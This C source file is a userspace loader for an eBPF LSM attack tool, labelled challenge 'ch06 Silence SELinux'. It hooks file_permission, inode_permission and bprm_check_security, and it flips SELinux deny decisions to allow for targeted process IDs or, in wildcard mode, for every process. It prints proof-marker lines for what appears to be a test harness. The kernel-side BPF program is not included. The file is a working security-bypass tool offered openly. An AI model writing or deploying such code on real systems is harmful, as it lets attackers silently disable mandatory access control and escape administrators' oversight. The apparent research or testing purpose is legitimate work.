// ch06 Silence SELinux LSM-variant loader: attaches three non-sleepable
// fmod_ret programs (file_permission, inode_permission, bprm_check_security)
// and flips any pending deny to allow for tgids in target_tgids.
//
// Prints `[ch06] FLIP hook=<name> pid=... orig=... -> 0` on every real
// flip — that format matches the harness proof-marker regex
// `CH06_PROVEN|CH06_WEAPON_PROVEN|FLIP\s+hook=`.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <getopt.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch06-silence-selinux-lsm.skel.h"

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;
    int orig_ret;
    int flipped;
};

static volatile sig_atomic_t stop;
static void on_sig(int s) { (void)s; stop = 1; }

static const char *hook_name(int h)
{
    switch (h) {
    case 1: return "file_permission";
    case 2: return "inode_permission";
    case 3: return "bprm_check_security";
    default: return "unknown";
    }
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt))
        return 0;
    const struct evt *e = data;
    if (e->flipped) {
        // stdout: the proof-marker line the harness scans for
        printf("[ch06] FLIP hook=%s pid=%u comm=%s orig=%d -> 0\n",
               hook_name(e->hook), e->pid, e->comm, e->orig_ret);
        fflush(stdout);
    }
    return 0;
}

static int check_lsm_bpf_enabled(void)
{
    FILE *f = fopen("/sys/kernel/security/lsm", "r");
    if (!f) {
        fprintf(stderr, "[ch06] /sys/kernel/security/lsm unreadable\n");
        return 0;
    }
    char buf[512] = {0};
    if (!fgets(buf, sizeof(buf), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    return strstr(buf, "bpf") != NULL;
}

static void usage(const char *argv0)
{
    fprintf(stderr,
            "Usage: %s [-a] [-t tgid]... [-h]\n"
            "  -a     wildcard: flip every SELinux deny for any tgid\n"
            "  -t N   flip denies originating from tgid N (repeatable)\n"
            "  -h     this help\n",
            argv0);
}

int main(int argc, char **argv)
{
    unsigned int tgid_args[1024];
    int n_tgid = 0;
    int all = 0;
    int opt;

    while ((opt = getopt(argc, argv, "at:h")) != -1) {
        switch (opt) {
        case 'a':
            all = 1;
            break;
        case 't':
            if (n_tgid < 1024)
                tgid_args[n_tgid++] = (unsigned int)atoi(optarg);
            break;
        case 'h':
            usage(argv[0]);
            return 0;
        default:
            usage(argv[0]);
            return 2;
        }
    }

    if (!check_lsm_bpf_enabled()) {
        fprintf(stderr,
                "[ch06] CH06_LSM_SKIP reason=\"BPF LSM not enabled "
                "(boot with lsm=bpf,selinux,...)\"\n");
        return 3;
    }
    fprintf(stderr, "[ch06] BPF LSM is active — proceeding\n");

    struct ch06_silence_selinux_lsm_bpf *s =
        ch06_silence_selinux_lsm_bpf__open_and_load();
    if (!s) {
        fprintf(stderr, "[ch06] CH06_LSM_SKIP reason=\"open_and_load: %s\"\n",
                strerror(errno));
        return 1;
    }

    int err = ch06_silence_selinux_lsm_bpf__attach(s);
    if (err) {
        fprintf(stderr, "[ch06] CH06_LSM_SKIP reason=\"attach: %s\"\n",
                strerror(-err));
        ch06_silence_selinux_lsm_bpf__destroy(s);
        return 1;
    }

    if (all) {
        unsigned int z = 0, v = 1;
        if (bpf_map__update_elem(s->maps.target_tgids, &z, sizeof(z),
                                 &v, sizeof(v), BPF_ANY) != 0) {
            fprintf(stderr, "[ch06] map update (wildcard): %s\n",
                    strerror(errno));
        } else {
            fprintf(stderr, "[ch06] mode=wildcard — every deny will flip\n");
        }
    }
    for (int i = 0; i < n_tgid; i++) {
        unsigned int v = 1;
        if (bpf_map__update_elem(s->maps.target_tgids, &tgid_args[i],
                                 sizeof(tgid_args[i]),
                                 &v, sizeof(v), BPF_ANY) != 0) {
            fprintf(stderr, "[ch06] map update for tgid=%u: %s\n",
                    tgid_args[i], strerror(errno));
        } else {
            fprintf(stderr, "[ch06] target tgid=%u\n", tgid_args[i]);
        }
    }

    struct ring_buffer *rb =
        ring_buffer__new(bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch06] ring_buffer__new: %s\n", strerror(errno));
        ch06_silence_selinux_lsm_bpf__destroy(s);
        return 1;
    }

    struct sigaction sa = {0};
    sa.sa_handler = on_sig;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGINT, &sa, NULL) != 0 ||
        sigaction(SIGTERM, &sa, NULL) != 0) {
        fprintf(stderr, "[ch06] sigaction: %s\n", strerror(errno));
        ring_buffer__free(rb);
        ch06_silence_selinux_lsm_bpf__destroy(s);
        return 1;
    }

    fprintf(stderr, "[ch06] active — SELinux denies for targeted tgids "
                    "will be flipped to allow\n");

    while (!stop) {
        int n = ring_buffer__poll(rb, 200);
        if (n < 0 && n != -EINTR)
            break;
    }

    ring_buffer__free(rb);
    ch06_silence_selinux_lsm_bpf__destroy(s);
    return 0;
}
